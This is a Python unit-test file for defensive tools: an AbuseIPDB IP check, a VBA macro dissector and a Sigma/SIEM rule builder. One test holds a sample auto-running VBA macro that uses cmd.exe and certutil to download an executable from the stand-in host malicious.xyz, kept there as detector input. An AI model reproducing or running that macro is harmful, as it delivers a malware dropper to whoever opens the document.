"""Unit tests for AbuseIPDB Threat Intel, Macro Forensics Dissector, and Sigma Detection Engine."""

import pytest
import yaml
from tools.threat_intel import check_abuseipdb
from tools.macro_dissector import DocumentMacroDissector
from tools.sigma_engine import SigmaRuleEngine


@pytest.mark.asyncio
async def test_abuseipdb_malicious_ip():
    """Verifies AbuseIPDB intelligence query for confirmed malicious C2 IP."""
    res = await check_abuseipdb("185.220.101.45")
    assert res.success is True
    data = res.data
    assert data["ip"] == "185.220.101.45"
    assert data["abuse_confidence_score"] == 100
    assert data["total_reports"] >= 800
    assert "MALICIOUS" in data["verdict"]
    assert data["country_code"] == "DE"
    assert "Stiftung" in data["isp"]


@pytest.mark.asyncio
async def test_abuseipdb_clean_ip():
    """Verifies AbuseIPDB intelligence query for clean IP."""
    res = await check_abuseipdb("8.8.8.8")
    assert res.success is True
    data = res.data
    assert data["ip"] == "8.8.8.8"
    assert data["abuse_confidence_score"] == 0
    assert data["total_reports"] == 0
    assert "BENIGN" in data["verdict"]


@pytest.mark.asyncio
async def test_abuseipdb_invalid_ip():
    """Verifies error handling for non-IP indicator."""
    res = await check_abuseipdb("not-an-ip.domain.com")
    assert res.success is False
    assert "Invalid IP address format" in res.error


def test_macro_dissector_list_samples():
    """Verifies that pre-configured macro samples are discoverable."""
    samples = DocumentMacroDissector.list_samples()
    assert len(samples) >= 3
    sample_ids = [s["sample_id"] for s in samples]
    assert "invoice.docx" in sample_ids
    assert "po_order.xlsm" in sample_ids
    assert "clean_quarterly_report.docx" in sample_ids


def test_macro_dissector_weaponized_sample():
    """Verifies dissection of weaponized Word document macro dropper."""
    res = DocumentMacroDissector.dissect_sample("invoice.docx")
    assert res.success is True
    data = res.data
    assert data["has_macros"] is True
    assert data["risk_score"] >= 70
    assert "MALICIOUS" in data["verdict"]
    assert "Document_Open" in data["auto_exec_triggers"]
    apis = [a["api"] for a in data["suspicious_apis"]]
    assert "WScript.Shell" in apis
    assert "powershell" in apis
    assert len(data["remediation_actions"]) > 0


def test_macro_dissector_clean_document():
    """Verifies dissection of benign document without macros."""
    res = DocumentMacroDissector.dissect_sample("clean_quarterly_report.docx")
    assert res.success is True
    data = res.data
    assert data["has_macros"] is False
    assert data["risk_score"] == 0
    assert data["verdict"] == "BENIGN"
    assert len(data["auto_exec_triggers"]) == 0


def test_macro_dissector_custom_vba():
    """Verifies direct inspection of raw VBA macro code snippet."""
    custom_vba = (
        "Sub AutoOpen()\n"
        '    Call Shell("cmd.exe /c certutil.exe -urlcache -split -f http://malicious.xyz/test.exe %TEMP%\\test.exe", vbHide)\n'
        "End Sub\n"
    )
    analysis = DocumentMacroDissector.dissect_macro_code(custom_vba, filename="custom.docm")
    assert analysis["has_macros"] is True
    assert "AutoOpen" in analysis["auto_exec_triggers"]
    apis = [a["api"] for a in analysis["suspicious_apis"]]
    assert "Shell" in apis
    assert "cmd.exe" in apis
    assert "CertUtil" in apis
    assert analysis["risk_score"] >= 70


def test_sigma_rule_engine_build_rule():
    """Verifies SigmaRuleEngine produces compliant Sigma YAML."""
    res = SigmaRuleEngine.build_sigma_rule(
        title="Detection of Cobalt Strike Beacon",
        ioc_type="IP",
        ioc_value="185.220.101.45",
        threat_description="Cobalt Strike C2",
        mitre_technique="T1071.001",
        severity="critical"
    )
    assert "rule_id" in res
    assert "sigma_yaml" in res
    parsed = yaml.safe_load(res["sigma_yaml"])
    assert parsed["title"] == "Detection of Cobalt Strike Beacon"
    assert parsed["level"] == "critical"
    assert parsed["detection"]["selection"]["DestinationIp"] == "185.220.101.45"
    assert "attack.t1071_001" in parsed["tags"]


def test_sigma_rule_engine_transpilers():
    """Verifies SIEM transpilation into Splunk SPL, Elastic KQL, Sentinel KQL, and firewalls."""
    ioc_ip = "185.220.101.45"
    splunk = SigmaRuleEngine.to_splunk_spl("IP", ioc_ip)
    assert "DestinationIp=\"185.220.101.45\"" in splunk

    elastic = SigmaRuleEngine.to_elastic_kql("IP", ioc_ip)
    assert 'destination.ip: "185.220.101.45"' in elastic

    sentinel = SigmaRuleEngine.to_sentinel_kql("IP", ioc_ip)
    assert 'RemoteIP == "185.220.101.45"' in sentinel

    fw = SigmaRuleEngine.to_firewall_rules("IP", ioc_ip)
    assert "nft add rule" in fw["nftables"]
    assert "iptables -A OUTPUT" in fw["iptables"]


def test_sigma_compile_full_suite():
    """Verifies end-to-end full detection suite compilation."""
    res = SigmaRuleEngine.compile_full_detection_suite(
        title="Automated C2 Defense Rule",
        ioc_type="IP",
        ioc_value="185.220.101.45",
        threat_description="Active C2 Cluster",
        mitre_technique="T1071.001",
        severity="high"
    )
    assert res.success is True
    data = res.data
    assert "sigma_yaml" in data
    assert "siem_targets" in data
    assert "splunk_spl" in data["siem_targets"]
    assert "elastic_kql" in data["siem_targets"]
    assert "microsoft_sentinel_kql" in data["siem_targets"]
    assert "firewall_containment" in data["siem_targets"]

